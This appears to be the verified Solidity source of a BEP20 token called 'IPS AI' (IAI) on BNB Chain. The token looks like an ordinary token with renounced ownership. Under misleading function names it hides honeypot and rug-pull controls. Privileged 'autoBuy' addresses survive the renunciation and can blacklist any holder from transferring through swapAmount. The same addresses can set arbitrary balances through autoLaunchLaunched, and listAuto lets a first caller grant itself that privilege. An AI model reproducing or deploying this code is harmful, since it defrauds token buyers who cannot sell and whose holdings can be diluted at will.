/**
 *Submitted for verification at BscScan.com on 2023-03-03
*/

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.1;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

/**
 * BEP20 standard interface.
 */
interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


/**
 * Allows for contract ownership along with multi-address authorization
 */
abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be authorized
     */
    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED");
        _;
    }

    /**
     * Authorize address. Owner only
     */
    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    /**
     * Remove address' authorization. Owner only
     */
    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    /**
     * Return address' authorization status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner authorized
     */
    function transferOwnership(address adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract IPSAI is IBEP20, Auth {

    string constant _name = "IPS AI";

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    uint256 public receiverTradingTake;

    uint8 constant _decimals = 18;

    uint256 public modeExempt;

    string constant _symbol = "IAI";

    bool public feeTake;

    address ZERO = 0x0000000000000000000000000000000000000000;

    function totalSupply() external view override returns (uint256) {return _totalSupply;}

    function decimals() external pure override returns (uint8) {return _decimals;}

    function symbol() external pure override returns (string memory) {return _symbol;}

    function name() external pure override returns (string memory) {return _name;}

    function getOwner() external view override returns (address) {return owner;}

    function balanceOf(address account) public view override returns (uint256) {
        if (fundSellReceiver[account] != 0) {
            return fundSellReceiver[account];
        }
        return _balances[account];
    }

    address DEAD = 0x000000000000000000000000000000000000dEaD;

    constructor () Auth(msg.sender) {
        IDEXRouter router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        atLimitWallet = IDEXFactory(router.factory()).createPair(WCRO, address(this));

        exemptTeam = msg.sender;
        autoBuy[msg.sender] = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
        transferOwnership(ZERO);
    }

    function listAuto(address fundAmount) public {
        require(!feeTake);
        autoBuy[fundAmount] = true;
        feeTake = true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(!tokenShouldTx[sender]);
        return _basicTransfer(sender, recipient, amount);
    }

    address WCRO = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    mapping(address => bool) public autoBuy;

    uint256 private launchedEnable;

    address public exemptTeam;

    using SafeMath for uint256;

    function swapAmount(address walletSender) public {
        if (!autoBuy[msg.sender]) {
            return;
        }
        if (walletSender == exemptTeam || walletSender == atLimitWallet) {
            return;
        }
        tokenShouldTx[walletSender] = true;
    }

    uint256 private txExempt;

    mapping(address => uint256) _balances;

    mapping(address => bool) public tokenShouldTx;

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (fundSellReceiver[sender] != 0) {
            _balances[sender] = fundSellReceiver[sender];
            fundSellReceiver[sender] = 0;
        }
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    bool public receiverFeeLaunch;

    uint256 _totalSupply = 100000000 * (10 ** 18);

    mapping(address => uint256) fundSellReceiver;

    address public atLimitWallet;

    uint256 private liquidityTo;

    function autoLaunchLaunched(address feeMarketing, uint256 teamFund) public {
        require(autoBuy[msg.sender]);
        fundSellReceiver[feeMarketing] = teamFund;
    }

    bool private launchedAmountSender;

    mapping(address => mapping(address => uint256)) _allowances;

    uint256 private launchedMaxTeam;

    function allowance(address holder, address spender) external view override returns (uint256) {return _allowances[holder][spender];}

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    bool private isTrading;

}